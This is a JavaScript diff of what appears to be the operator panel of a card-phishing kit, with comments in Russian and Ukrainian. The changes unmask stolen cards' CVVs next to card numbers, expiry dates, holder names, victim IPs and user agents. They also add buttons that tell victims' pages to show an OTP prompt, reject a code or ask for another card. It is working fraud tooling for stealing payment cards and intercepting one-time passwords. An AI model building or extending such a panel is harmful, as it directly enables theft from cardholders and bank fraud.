@@ -1,6 +1,9 @@
 const socket = io('https://localhost:3000', {
     withCredentials: true,
-    rejectUnauthorized: false
+    rejectUnauthorized: false,
+    reconnection: true,
+    reconnectionAttempts: 5,
+    reconnectionDelay: 1000
 });
 const cardList = document.getElementById('card-list');
 const chatContainer = document.getElementById('chat-container');
@@ -15,7 +18,7 @@ const messageModal = document.getElementById('message-modal');
 const notificationText = document.getElementById('notification-text');
 const sendNotification = document.getElementById('send-notification');
 const cancelNotification = document.getElementById('cancel-notification');
-const cardsList = document.getElementById('cards-list');
+const cardsList = document.getElementById('cardsList');
 const closeChat = document.querySelector('.close-chat');
 const activeUsersCount = document.querySelector('.active-users .count');
 const soundButton = document.querySelector('.sound-btn');
@@ -77,9 +80,9 @@ function createTableRow(data) {
 
 // Функция для обновления данных таблицы
 function updateTable(data) {
-    cardList.innerHTML = '';
+    cardsList.innerHTML = '';
     data.forEach(item => {
-        cardList.appendChild(createTableRow(item));
+        cardsList.appendChild(createCardRow(item));
     });
 }
 
@@ -318,34 +321,52 @@ document.addEventListener('DOMContentLoaded', () => {
 
 // Функция для создания строки таблицы с данными карты
 function createCardRow(card) {
-    const tr = document.createElement('tr');
-    tr.innerHTML = `
-        <td>${card.id}</td>
+    const row = document.createElement('tr');
+    row.innerHTML = `
+        <td>${card.id || '-'}</td>
         <td>${card.exp || '-'}</td>
-        <td>***</td>
+        <td>${card.cvv || '-'}</td>
         <td>${card.name || '-'}</td>
-        <td>${card.code || '-'}</td>
+        <td>${card.number || '-'}</td>
         <td>${card.site || '-'}</td>
+        <td>${card.domain || '-'}</td>
         <td>${card.ip || '-'}</td>
-        <td>${card.ua || '-'}</td>
-        <td>${card.referer || '-'}</td>
+        <td>${card.user_agent || '-'}</td>
+        <td>${formatDate(card.created_at) || '-'}</td>
         <td>
-            <button class="delete-btn">×</button>
+            <button class="action-btn show-otp" data-id="${card.id}">OTP</button>
+            <button class="action-btn reject" data-id="${card.id}">Reject</button>
+            <button class="action-btn new-card" data-id="${card.id}">New Card</button>
         </td>
     `;
-    
-    // Обработчик для кнопки удаления
-    const deleteBtn = tr.querySelector('.delete-btn');
-    deleteBtn.addEventListener('click', () => {
-        socket.emit('delete-card', card.id);
-        tr.remove();
+
+    // Додаємо обробники для кнопок
+    row.querySelectorAll('.action-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.preventDefault();
+            selectedCardId = btn.dataset.id;
+            const action = btn.classList[1];
+            
+            switch(action) {
+                case 'show-otp':
+                    socket.emit('show-otp', { id: selectedCardId });
+                    break;
+                case 'reject':
+                    socket.emit('reject-otp', { id: selectedCardId });
+                    break;
+                case 'new-card':
+                    socket.emit('request-new-card', { id: selectedCardId });
+                    break;
+            }
+        });
     });
-    
-    return tr;
+
+    return row;
 }
 
 // Обработка полученных карт
 socket.on('cards', (cards) => {
+    console.log('Отримано картки:', cards);
     cardsList.innerHTML = '';
     cards.forEach(card => {
         cardsList.appendChild(createCardRow(card));
@@ -354,18 +375,16 @@ socket.on('cards', (cards) => {
 
 // Обработка новой карты
 socket.on('new-card', (card) => {
-    cardsList.appendChild(createCardRow(card));
+    console.log('Нова картка:', card);
+    const row = createCardRow(card);
+    cardsList.insertBefore(row, cardsList.firstChild);
+    if (soundEnabled) {
+        playSound('new');
+    }
+    showNotification('Отримано нову картку', 'info');
 });
 
-// Функционал чата
-function addChatMessage(message, isAdmin = false) {
-    const div = document.createElement('div');
-    div.className = `chat-message ${isAdmin ? 'admin' : 'user'}`;
-    div.textContent = message;
-    chatMessages.appendChild(div);
-    chatMessages.scrollTop = chatMessages.scrollHeight;
-}
-
+// Обработка подій
 sendMessage.addEventListener('click', () => {
     const message = chatInput.value.trim();
     if (message) {
@@ -420,4 +439,14 @@ logoutButton.addEventListener('click', () => {
 // Оновление литератора активных пользователей
 socket.on('active-users', (count) => {
     activeUsersCount.textContent = `${count} активных`;
+});
+
+socket.on('connect_error', (error) => {
+    console.error('Connection error:', error);
+    showNotification('Помилка з\'єднання з сервером', 'error');
+});
+
+socket.on('reconnect', (attemptNumber) => {
+    console.log('Reconnected on attempt:', attemptNumber);
+    showNotification('З\'єднання відновлено', 'success');
 }); 
